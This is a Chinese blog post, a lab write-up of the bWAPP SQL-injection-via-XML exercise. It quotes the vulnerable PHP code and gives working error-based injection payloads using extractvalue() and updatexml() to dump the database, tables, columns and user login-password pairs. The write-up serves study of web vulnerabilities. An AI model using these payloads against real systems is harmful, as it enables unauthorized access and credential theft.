@@ -1,0 +1,339 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="XML注入代码分析123456789101112131415161718192021&#x2F;&#x2F;sqli8-1.php 点击按钮之后调用javascript,跳转到sqli8-2.php    &lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt;        function ResetSecret()        &amp;#123;            var xmlHttp;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="bWAPP-SQLiXML">
+<meta property="og:url" content="http://yoursite.com/2020/09/22/bWAPP-SQLiXML/index.html">
+<meta property="og:site_name" content="Tansz">
+<meta property="og:description" content="XML注入代码分析123456789101112131415161718192021&#x2F;&#x2F;sqli8-1.php 点击按钮之后调用javascript,跳转到sqli8-2.php    &lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt;        function ResetSecret()        &amp;#123;            var xmlHttp;">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://yoursite.com/2020/09/22/bWAPP-SQLiXML/image-20200922193435147.png">
+<meta property="og:image" content="http://yoursite.com/2020/09/22/bWAPP-SQLiXML/image-20200922193717938.png">
+<meta property="og:image" content="http://yoursite.com/2020/09/22/bWAPP-SQLiXML/image-20200922194134054.png">
+<meta property="og:image" content="http://yoursite.com/2020/09/22/bWAPP-SQLiXML/image-20200922202027015.png">
+<meta property="og:image" content="http://yoursite.com/2020/09/22/bWAPP-SQLiXML/image-20200922202017200.png">
+<meta property="article:published_time" content="2020-09-22T08:53:15.867Z">
+<meta property="article:modified_time" content="2020-09-22T12:20:31.515Z">
+<meta property="article:author" content="Tansz">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yoursite.com/2020/09/22/bWAPP-SQLiXML/image-20200922193435147.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>bWAPP-SQLiXML</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" href="/2020/09/22/bWAPP-SQLiInsert/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2020/09/22/bWAPP-SQLiXML/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2020/09/22/bWAPP-SQLiXML/&text=bWAPP-SQLiXML" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2020/09/22/bWAPP-SQLiXML/&title=bWAPP-SQLiXML" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2020/09/22/bWAPP-SQLiXML/&is_video=false&description=bWAPP-SQLiXML" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=bWAPP-SQLiXML&body=Check out this article: http://yoursite.com/2020/09/22/bWAPP-SQLiXML/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2020/09/22/bWAPP-SQLiXML/&title=bWAPP-SQLiXML" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2020/09/22/bWAPP-SQLiXML/&title=bWAPP-SQLiXML" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2020/09/22/bWAPP-SQLiXML/&title=bWAPP-SQLiXML" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2020/09/22/bWAPP-SQLiXML/&title=bWAPP-SQLiXML" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2020/09/22/bWAPP-SQLiXML/&name=bWAPP-SQLiXML&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://yoursite.com/2020/09/22/bWAPP-SQLiXML/&t=bWAPP-SQLiXML" target="_blank" rel="noopener"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#XML注入"><span class="toc-number">1.</span> <span class="toc-text">XML注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#代码分析"><span class="toc-number">1.1.</span> <span class="toc-text">代码分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#low"><span class="toc-number">1.2.</span> <span class="toc-text">low</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#extractvalue-用法"><span class="toc-number">2.</span> <span class="toc-text">extractvalue()用法</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#函数解释"><span class="toc-number">2.1.</span> <span class="toc-text">函数解释</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#updatexml-用法"><span class="toc-number">3.</span> <span class="toc-text">updatexml()用法</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#函数解释-1"><span class="toc-number">3.1.</span> <span class="toc-text">函数解释</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        bWAPP-SQLiXML
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Tansz</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2020-09-22T08:53:15.867Z" itemprop="datePublished">2020-09-22</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h1 id="XML注入"><a href="#XML注入" class="headerlink" title="XML注入"></a>XML注入</h1><h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//sqli8-1.php 点击按钮之后调用javascript,跳转到sqli8-2.php</span></span><br><span class="line">    &lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">ResetSecret</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">var</span> xmlHttp;</span><br><span class="line">            <span class="comment">// Code for IE7+, Firefox, Chrome, Opera, Safari</span></span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">window</span>.XMLHttpRequest)</span><br><span class="line">            &#123;</span><br><span class="line">                xmlHttp = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// Code for IE6, IE5</span></span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                xmlHttp = <span class="keyword">new</span> ActiveXObject(<span class="string">"Microsoft.XMLHTTP"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            xmlHttp.open(<span class="string">"POST"</span>,<span class="string">"sqli_8-2.php"</span>,<span class="literal">true</span>);</span><br><span class="line">            xmlHttp.setRequestHeader(<span class="string">"Content-type"</span>,<span class="string">"text/xml; charset=UTF-8"</span>);</span><br><span class="line">            xmlHttp.send(<span class="string">"&lt;reset&gt;&lt;login&gt;&lt;?php if(isset($_SESSION["</span>login<span class="string">"]))&#123;echo $_SESSION["</span>login<span class="string">"];&#125;?&gt;&lt;/login&gt;&lt;secret&gt;Any bugs?&lt;/secret&gt;&lt;/reset&gt;"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//sqli8-2.php 接收传递过来的数据</span></span><br><span class="line"><span class="keyword">if</span>($_COOKIE[<span class="string">"security_level"</span>] != <span class="string">"1"</span> &amp;&amp; $_COOKIE[<span class="string">"security_level"</span>] != <span class="string">"2"</span>)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    ini_set(<span class="string">"display_errors"</span>,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    $xml = simplexml_load_string($body);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Debugging</span></span><br><span class="line">    <span class="comment">// print_r($xml);</span></span><br><span class="line"></span><br><span class="line">    $login = $xml-&gt;login;</span><br><span class="line">    $secret = $xml-&gt;secret;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($login &amp;&amp; $login != <span class="string">""</span> &amp;&amp; $secret)</span><br><span class="line">    &#123;</span><br><span class="line">		</span><br><span class="line">        $sql = <span class="string">"UPDATE users SET secret = '"</span> . $secret . <span class="string">"' WHERE login = '"</span> . $login . <span class="string">"'"</span>;</span><br><span class="line">        <span class="comment">//可对查询语句进行注入，闭合 '</span></span><br><span class="line">        <span class="comment">// Debugging</span></span><br><span class="line">        <span class="comment">// echo $sql;      </span></span><br><span class="line">        $recordset = $link-&gt;query($sql);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!$recordset)</span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"Connect Error: "</span> . $link-&gt;error);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $message = $login . <span class="string">"'s secret has been reset!"</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="low"><a href="#low" class="headerlink" title="low"></a>low</h2><ul>
+<li>爆库</li>
+</ul>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">reset</span>&gt;</span><span class="tag">&lt;<span class="name">login</span>&gt;</span>1' or extractvalue(null,concat('#',(select database()))) or '<span class="tag">&lt;/<span class="name">login</span>&gt;</span><span class="tag">&lt;<span class="name">secret</span>&gt;</span>Any bugs?<span class="tag">&lt;/<span class="name">secret</span>&gt;</span><span class="tag">&lt;/<span class="name">reset</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/09/22/bWAPP-SQLiXML/image-20200922193435147.png" alt="image-20200922193435147"></p>
+<ul>
+<li>爆表</li>
+</ul>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">reset</span>&gt;</span><span class="tag">&lt;<span class="name">login</span>&gt;</span>1' or extractvalue(null,concat('#',(select group_concat(table_name) from information_schema.tables where table_schema=database()))) or '<span class="tag">&lt;/<span class="name">login</span>&gt;</span><span class="tag">&lt;<span class="name">secret</span>&gt;</span>Any bugs?<span class="tag">&lt;/<span class="name">secret</span>&gt;</span><span class="tag">&lt;/<span class="name">reset</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/09/22/bWAPP-SQLiXML/image-20200922193717938.png" alt="image-20200922193717938"></p>
+<ul>
+<li><p>爆列</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">reset</span>&gt;</span><span class="tag">&lt;<span class="name">login</span>&gt;</span>1' or extractvalue(null,concat('#',(select group_concat(column_name) from information_schema.columns where table_name="users" and table_schema=database()))) or '<span class="tag">&lt;/<span class="name">login</span>&gt;</span><span class="tag">&lt;<span class="name">secret</span>&gt;</span>Any bugs?<span class="tag">&lt;/<span class="name">secret</span>&gt;</span><span class="tag">&lt;/<span class="name">reset</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/09/22/bWAPP-SQLiXML/image-20200922194134054.png" alt="image-20200922194134054"></p>
+</li>
+<li><p>获取信息</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">reset</span>&gt;</span><span class="tag">&lt;<span class="name">login</span>&gt;</span>1' or extractvalue(null,concat(0x7e,(select group_concat(login,'-',password) from users ))) or '<span class="tag">&lt;/<span class="name">login</span>&gt;</span><span class="tag">&lt;<span class="name">secret</span>&gt;</span>Any bugs?<span class="tag">&lt;/<span class="name">secret</span>&gt;</span><span class="tag">&lt;/<span class="name">reset</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/09/22/bWAPP-SQLiXML/image-20200922202027015.png" alt="image-20200922202027015"></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">reset</span>&gt;</span><span class="tag">&lt;<span class="name">login</span>&gt;</span>1' or extractvalue(null,concat(0x7e,substring((select group_concat(login,'-',password) from users),49,81))) or '<span class="tag">&lt;/<span class="name">login</span>&gt;</span><span class="tag">&lt;<span class="name">secret</span>&gt;</span>Any bugs?<span class="tag">&lt;/<span class="name">secret</span>&gt;</span><span class="tag">&lt;/<span class="name">reset</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/09/22/bWAPP-SQLiXML/image-20200922202017200.png" alt="image-20200922202017200"></p>
+</li>
+</ul>
+<h1 id="extractvalue-用法"><a href="#extractvalue-用法" class="headerlink" title="extractvalue()用法"></a>extractvalue()用法</h1><p>mysql 5.1以后推出了xml的解析支持</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> extractValue(<span class="string">'&lt;a href="sss"&gt;&lt;/a&gt;&lt;a href="2333"&gt;&lt;/a&gt;'</span>,<span class="string">'/a/attribute::href'</span>) <span class="keyword">body</span> <span class="keyword">FROM</span> <span class="string">`casexml`</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="函数解释"><a href="#函数解释" class="headerlink" title="函数解释"></a>函数解释</h2><p>　　extractvalue()：从目标XML中返回包含所查询值的字符串。<br>　　EXTRACTVALUE (XML_document, XPath_string);<br>　　第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc<br>　　第二个参数：XPath_string (Xpath格式的字符串)</p>
+<p><strong>第二个参数 xml中的位置是可操作的地方</strong>，xml文档中查找字符位置是用 /xxx/xxx/xxx/…这种格式，如果我们写入其他格式，就会报错，<strong>并且会返回我们写入的非法格式内容，而这个非法的内容就是我们想要查询的内容</strong></p>
+<p>正常查询 第二个参数的位置格式 为 /xxx/xx/xx/xx ,即使查询不到也不会报错</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--正常查询，无报错</span></span><br><span class="line"><span class="keyword">select</span> username <span class="keyword">from</span> security.user <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> (extractvalue(<span class="literal">null</span>,<span class="string">'/x/xx'</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">--非正常查询</span></span><br><span class="line"><span class="keyword">select</span> username <span class="keyword">from</span> security.user <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> (extractvalue(<span class="literal">null</span>,<span class="keyword">concat</span>(<span class="string">'~'</span>,(<span class="keyword">select</span> <span class="keyword">database</span>()))))</span><br><span class="line"></span><br><span class="line"><span class="comment">--结果 为执行database()函数并返回数据库名</span></span><br><span class="line"></span><br><span class="line"><span class="comment">--其中 concat的第一个参数为 ~的目的是因为以~开头的内容不是正确的xml命名规则的语法,所以导致报错，从而执行database()</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#XML元素的命名规则</span></span><br><span class="line">1、元素的名字可以包含字母、数字、和其他字符</span><br><span class="line"></span><br><span class="line">2、元素的名字不能以xml（XML、Xml、xML等）开头</span><br><span class="line"></span><br><span class="line">3、元素的名字不能以数字或者标点符号开头</span><br><span class="line"></span><br><span class="line">4、元素的名字不能包含空格</span><br><span class="line"></span><br><span class="line">5、XML文档除了XML以外，没有其他所谓的保留字，任何的名字都可以使用，但是应该尽量使元素名字具有可读性，名字使用下划线是个不错的选择</span><br><span class="line"></span><br><span class="line">6、尽量避免使用<span class="string">"-"</span>和<span class="string">"."</span>，因为可能引起混乱。</span><br><span class="line"></span><br><span class="line">7、在XML元素命名中不要使用”:”,因为XML命名空间需要用到这个十分特殊的字符。</span><br></pre></td></tr></table></figure>
+
+<h1 id="updatexml-用法"><a href="#updatexml-用法" class="headerlink" title="updatexml()用法"></a>updatexml()用法</h1><h2 id="函数解释-1"><a href="#函数解释-1" class="headerlink" title="函数解释"></a>函数解释</h2><p>updatexml(XML_document, XPath_string, string)</p>
+<p>​                        目标xml文档，xml路径，更新的内容</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> username <span class="keyword">from</span> security.user <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> (updatexml(<span class="string">'anything'</span>,<span class="string">'/xx/xx'</span>,<span class="string">'anything'</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> username <span class="keyword">from</span> security.user <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> (updatexml(<span class="string">'anything'</span>,<span class="keyword">concat</span>(<span class="string">'~'</span>,(<span class="keyword">select</span> <span class="keyword">database</span>())),<span class="string">'anything'</span>))</span><br></pre></td></tr></table></figure>
+
+<p>需要注意，extractvalue()和updatexml()能查询字符串的最大长度为32，就是说如果我们想要的结果超过32，就需要用substring()函数截取，一次查看32位。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> username <span class="keyword">from</span> security.user <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> (extractvalue(<span class="literal">null</span>,<span class="keyword">concat</span>(<span class="string">'~'</span>,<span class="keyword">substring</span>(<span class="keyword">hex</span>((<span class="keyword">select</span> <span class="keyword">database</span>())),<span class="number">1</span>,<span class="number">5</span>))))</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> username <span class="keyword">from</span> security.user <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> (updatexml(<span class="string">'anything'</span>,<span class="keyword">concat</span>(<span class="string">'~'</span>,(<span class="keyword">select</span> <span class="keyword">database</span>())),<span class="string">'anything'</span>))</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://blog.csdn.net/zpy1998zpy/article/details/80631036" target="_blank" rel="noopener">extractvalue()/updatexml()</a></p>
+<p><a href="https://www.jianshu.com/p/361a2cb6d3e5" target="_blank" rel="noopener">XML语法</a></p>
+<p><a href="https://www.w3school.com.cn/dtd/index.asp" target="_blank" rel="noopener">DTD</a></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#XML注入"><span class="toc-number">1.</span> <span class="toc-text">XML注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#代码分析"><span class="toc-number">1.1.</span> <span class="toc-text">代码分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#low"><span class="toc-number">1.2.</span> <span class="toc-text">low</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#extractvalue-用法"><span class="toc-number">2.</span> <span class="toc-text">extractvalue()用法</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#函数解释"><span class="toc-number">2.1.</span> <span class="toc-text">函数解释</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#updatexml-用法"><span class="toc-number">3.</span> <span class="toc-text">updatexml()用法</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#函数解释-1"><span class="toc-number">3.1.</span> <span class="toc-text">函数解释</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2020/09/22/bWAPP-SQLiXML/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2020/09/22/bWAPP-SQLiXML/&text=bWAPP-SQLiXML" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2020/09/22/bWAPP-SQLiXML/&title=bWAPP-SQLiXML" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2020/09/22/bWAPP-SQLiXML/&is_video=false&description=bWAPP-SQLiXML" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=bWAPP-SQLiXML&body=Check out this article: http://yoursite.com/2020/09/22/bWAPP-SQLiXML/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2020/09/22/bWAPP-SQLiXML/&title=bWAPP-SQLiXML" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2020/09/22/bWAPP-SQLiXML/&title=bWAPP-SQLiXML" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2020/09/22/bWAPP-SQLiXML/&title=bWAPP-SQLiXML" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2020/09/22/bWAPP-SQLiXML/&title=bWAPP-SQLiXML" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2020/09/22/bWAPP-SQLiXML/&name=bWAPP-SQLiXML&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://yoursite.com/2020/09/22/bWAPP-SQLiXML/&t=bWAPP-SQLiXML" target="_blank" rel="noopener"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    1970-2020
+    Tansz
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
